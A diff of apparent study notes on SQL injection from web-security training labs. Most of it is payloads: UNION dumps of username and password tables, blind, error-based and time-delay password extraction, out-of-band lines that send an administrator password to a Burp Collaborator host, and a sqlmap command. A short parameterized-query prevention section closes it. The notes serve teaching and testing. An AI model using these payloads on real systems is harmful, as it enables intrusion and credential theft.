@@ -1,86 +1,121 @@
-SQL injection cheat sheet:
+# SQL Injection
+
+## SQL injection cheat sheet:
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-'
+`'`
+
 The single quote character ' and look for errors or other anomalies
 
-Different
-Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses
+Different --> Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses
 
+```
 '--
 https://insecure-website.com/products?category=Gifts'--
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+```
 
+```
 '+OR+1=1--
 https://insecure-website.com/products?category=Gifts'+OR+1=1--
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+```
 
+```
 administrator'--
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+```
 
-UNION attacks:
+## UNION attacks:
 UNION keyword to retrieve data from other tables within the database
 
 Two key requirements must be met:
+
 The individual queries must return the same number of columns
+
 The data types in each column must be compatible between the individual queries
 
 Determining the number of columns required:
+```
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
+```
+
 Until
+
 The ORDER BY position number 3 is out of range of the number of items in the select list
 
+```
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+```
+
 If the number of nulls does not match the number of columns, the database returns an error
+
 All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists
 
-Oracle
+## Oracle
 On Oracle, every SELECT query must use the FROM keyword and specify a valid table
-There is a built-in table on Oracle called dual
-' UNION SELECT NULL FROM DUAL--
 
-Finding columns with a useful data type:
+There is a built-in table on Oracle called dual
+
+`' UNION SELECT NULL FROM DUAL--`
+
+## Finding columns with a useful data type:
 probe each column to test whether it can hold string data
+
+```
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
 If the column data type is not compatible with string data, the injected query will cause a database error
+
 Conversion failed when converting the varchar value 'a' to data type int
 
-' UNION SELECT username, password FROM users--
+`' UNION SELECT username, password FROM users--`
 
-Retrieving multiple values within a single column:
+## Retrieving multiple values within a single column:
 on Oracle
-' UNION SELECT username || '~' || password FROM users--
 
-'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+`' UNION SELECT username || '~' || password FROM users--`
+
+`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
 
 Examining the database:
+```
 Microsoft, MySQL --> SELECT @@version
 Oracle --> SELECT * FROM v$version
 PostgreSQL --> SELECT version()
+```
 
-%27%20UNION%20SELECT%20@@version,%20%27def%27%23 --> %23="#" --> Comment
+`%27%20UNION%20SELECT%20@@version,%20%27def%27%23` --> %23="#" --> Comment
 
-Listing the contents of the database:
+## Listing the contents of the database:
 Most database types (except Oracle) have a set of views called the information schema
+
+```
 SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+```
 
-Blind SQL:
+## Blind SQL:
+```
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+
 The SUBSTRING function is called SUBSTR on some types of database
 
+```
 TrackingId=xyz' AND '1'='1
 TrackingId=xyz' AND '1'='2
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
@@ -88,12 +123,16 @@ TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+```
 
-Error-based SQL injection:
+## Error-based SQL injection:
+```
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
 
+```
 TrackingId=xyz' --> Verify that an error message is received
 TrackingId=xyz'' --> Verify that the error disappears
 TrackingId=xyz'||(SELECT '')||' --> confirm is a SQL syntax error
@@ -105,14 +144,18 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
 
-Extracting sensitive data via verbose SQL error messages:
+## Extracting sensitive data via verbose SQL error messages:
 injecting a single quote into an id parameter
+
 Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
 
-CAST((SELECT example_column FROM example_table) AS int)
+`CAST((SELECT example_column FROM example_table) AS int)`
+
 ERROR: invalid input syntax for type integer: "Example data"
 
+```
 TrackingId=ogAZZfxtOKUELbuJ' --> notice the verbose error message
 TrackingId=ogAZZfxtOKUELbuJ'-- --> no longer receive an error
 TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- --> get a different error saying that an AND condition must be a boolean expression
@@ -121,69 +164,93 @@ TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)-- -
 TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- --> free up some additional characters
 TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- --> return only one row
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
 
-Exploiting blind SQL injection by triggering time delays:
+## Exploiting blind SQL injection by triggering time delays:
 on Microsoft SQL Server
+```
 '; IF (1=2) WAITFOR DELAY '0:0:10'--
 '; IF (1=1) WAITFOR DELAY '0:0:10'--
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
 
+```
 TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --> takes 10 seconds to respond
 TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --> no time delay
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
 
-Exploiting blind SQL injection using out-of-band (OAST) techniques:
+## Exploiting blind SQL injection using out-of-band (OAST) techniques:
 exploit the SQL injection vulnerability to cause a DNS lookup
+
 on Microsoft SQL Server
-'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
 
 Combine SQL injection with basic XXE techniques
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
 
 Use the out-of-band channel to exfiltrate data
-'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
 
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
 
-SQL injection in different contexts:
+`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
+
+## SQL injection in different contexts:
 Some websites take input in JSON or XML format and use this to query the database
+
 XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT
+```
 <stockCheck>
     <productId>123</productId>
     <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
 </stockCheck>
+```
 
+```
 <productId>1+1</productId> --> Check SQL query
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId> --> Using Hackvertor
+```
 
-How to prevent SQL injection:
+## How to prevent SQL injection:
 Using parameterized queries instead of string concatenation within the query
 
 Vulnerable
+
+```
 String query = "SELECT * FROM products WHERE category = '"+ input + "'";
 Statement statement = connection.createStatement();
 ResultSet resultSet = statement.executeQuery(query);
+```
 
 Rewrite
+
+```
 PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
 statement.setString(1, input);
 ResultSet resultSet = statement.executeQuery();
+```
 
 Whitelisting permitted input values
+
 Using different logic to deliver the required behaviour
 
 Oracle:
+```
 'and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,10)--
 value' AND (select Ascii(SUBSTR(global_name,1,1)) from global_name) <128 OR '4'='0
+```
 
-SQLMap:
-python3 sqlmap.py -u <URL> --cookie "JSESSIONID=<ID>;" --data "<Post Data>" -p <Inject Parameter>
-
-Oracle:
+```
 '+UNION+SELECT+'abc','def'+FROM+dual--
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 '+UNION+SELECT+table_name,NULL+FROM+all_tables--
 '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+```
+
+## SQLMap:
+`python3 sqlmap.py -u <URL> --cookie "JSESSIONID=<ID>;" --data "<Post Data>" -p <Inject Parameter>`
